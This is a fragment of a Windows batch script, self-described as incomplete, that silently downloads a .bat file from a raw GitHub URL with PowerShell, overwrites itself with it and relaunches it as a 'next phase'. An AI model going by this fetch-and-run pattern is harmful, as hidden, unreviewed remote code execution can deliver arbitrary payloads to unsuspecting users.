REM This file is incomplete, required snippits only.
















REM this sends a file download request to the github to install the next phase as shown previously in the first phase.

if /i not "%~1"=="BreakoutC" (
    echo Updating %~nx0 ...
    >nul 2>&1 powershell iwr "https://raw.githubusercontent.com/Krayz7436/Batch/refs/heads/main/BREAKOUTc.bat" -OutFile "%temp%\%~nx0"
    >nul 2>&1 move /y "%temp%\%~nx0" "%~dpnx0"
    >nul 2>&1 powershell start "%~0" BreakoutC & exit /b
)
cd /d "%~dp0"
pause
